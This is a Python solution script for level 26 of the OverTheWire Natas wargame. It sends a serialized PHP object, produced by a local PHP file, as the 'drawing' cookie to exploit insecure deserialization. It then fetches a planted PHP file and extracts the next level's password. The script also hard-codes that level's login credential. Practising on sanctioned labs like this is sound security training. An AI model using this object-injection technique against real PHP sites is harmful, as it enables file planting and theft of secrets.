import requests
from requests.auth import HTTPBasicAuth
import re
import subprocess

pass_reg = '[a-zA-Z0-9]{32}'



def solve():
    auth = HTTPBasicAuth('natas26','oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T')
    cook = {'drawing':subprocess.run(['php', 'natas26serializestring.php'], stdout=subprocess.PIPE).stdout.decode('utf-8'), 'PHPSESSID':'tald'}
    r = requests.get('http://natas26.natas.labs.overthewire.org/', auth=auth, cookies=cook)   
    url = r.text.find
    r = requests.get('http://natas26.natas.labs.overthewire.org/img/natas26_tald.php', auth=auth, cookies=cook)    
    
    print(re.findall(pass_reg, r.text)[0])
if __name__ == '__main__':
    solve()
    

